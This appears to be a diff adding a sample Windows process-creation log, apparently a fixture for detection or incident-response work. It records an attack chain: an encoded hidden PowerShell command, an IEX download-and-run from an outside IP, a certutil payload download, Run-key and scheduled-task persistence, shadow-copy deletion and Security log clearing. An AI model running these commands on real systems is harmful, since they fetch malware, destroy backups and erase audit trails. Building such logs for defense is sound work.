@@ -1,0 +1,10 @@
+{"timestamp": "2026-06-08T09:01:12Z", "host": "WS-FINANCE-04", "user": "alice", "image": "C:\\Windows\\System32\\notepad.exe", "cmdline": "notepad.exe budget_q2.txt"}
+{"timestamp": "2026-06-08T09:03:44Z", "host": "WS-FINANCE-04", "user": "alice", "image": "C:\\Windows\\System32\\whoami.exe", "cmdline": "whoami /all"}
+{"timestamp": "2026-06-08T09:14:07Z", "host": "WS-FINANCE-04", "user": "alice", "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "cmdline": "powershell.exe -nop -w hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA"}
+{"timestamp": "2026-06-08T09:14:31Z", "host": "WS-FINANCE-04", "user": "alice", "image": "powershell.exe", "cmdline": "powershell -c IEX(New-Object Net.WebClient).DownloadString('http://198.51.100.23/a.ps1')"}
+{"timestamp": "2026-06-08T09:15:02Z", "host": "WS-FINANCE-04", "user": "alice", "image": "C:\\Windows\\System32\\certutil.exe", "cmdline": "certutil.exe -urlcache -split -f http://198.51.100.23/payload.exe C:\\Users\\alice\\AppData\\Local\\Temp\\p.exe"}
+{"timestamp": "2026-06-08T09:16:20Z", "host": "WS-FINANCE-04", "user": "alice", "image": "C:\\Windows\\System32\\reg.exe", "cmdline": "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater /t REG_SZ /d C:\\Users\\alice\\AppData\\Local\\Temp\\p.exe /f"}
+{"timestamp": "2026-06-08T09:18:55Z", "host": "WS-FINANCE-04", "user": "SYSTEM", "image": "C:\\Windows\\System32\\schtasks.exe", "cmdline": "schtasks /create /tn UpdaterTask /tr C:\\Users\\alice\\AppData\\Local\\Temp\\p.exe /sc minute /mo 30 /f"}
+{"timestamp": "2026-06-08T09:22:10Z", "host": "WS-FINANCE-04", "user": "SYSTEM", "image": "C:\\Windows\\System32\\vssadmin.exe", "cmdline": "vssadmin delete shadows /all /quiet"}
+{"timestamp": "2026-06-08T09:22:41Z", "host": "WS-FINANCE-04", "user": "SYSTEM", "image": "C:\\Windows\\System32\\wevtutil.exe", "cmdline": "wevtutil cl Security"}
+{"timestamp": "2026-06-08T08:55:00Z", "host": "DC-01", "event_id": "4625", "user": "administrator", "message": "An account failed to log on. Logon Type: 3. Source Network Address: 203.0.113.66"}
